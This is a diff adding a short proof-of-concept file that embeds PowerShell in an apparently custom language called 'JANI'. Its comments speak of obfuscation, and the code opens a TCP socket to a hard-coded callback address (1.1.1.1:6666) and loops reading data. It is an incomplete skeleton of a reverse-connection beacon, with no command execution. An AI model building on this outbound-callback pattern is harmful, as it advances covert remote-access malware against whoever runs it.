@@ -1,0 +1,33 @@
+# ⚠ This PowerShell code will not obfuscate, thus it's not recommended to use in production.
+#    This is because, in the current state of JANI, PowerShell bindings are not parsed.
+#    That said, it's rather a PoC (Proof of Concept) that can be learned from, or used in
+#      urgent (*education-only*) cases.
+
+# Also I know this code looks like fucking c++ well uhh
+# Maybe i'll fix it later
+# By fixing it i mean adding more things to the language and improving the default library because it's all ass rn
+
+bind @header `
+    $CONNECT_TO = "1.1.1.1:6666";
+`;
+
+decl <no_remap> C(): any;
+
+bind C `
+    $parts = $CONNECT_TO.Split(':');
+
+    $sock = [System.Net.Sockets.Socket]::new([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::IP);
+    $ip = [System.Net.IPAddress]::Parse($parts[0]).Address;
+    $port = [int]::Parse($parts[1]);
+    $sock.Connect([System.Net.IPEndPoint]::new($ip, $port));
+
+    return $sock;
+`;
+
+bind @header `
+    $sock = C();
+    while ($sock.Connected) {
+        $buffer = [byte[]]::new(4);
+        $msg = $sock.Receive($buffer);
+    }
+`;
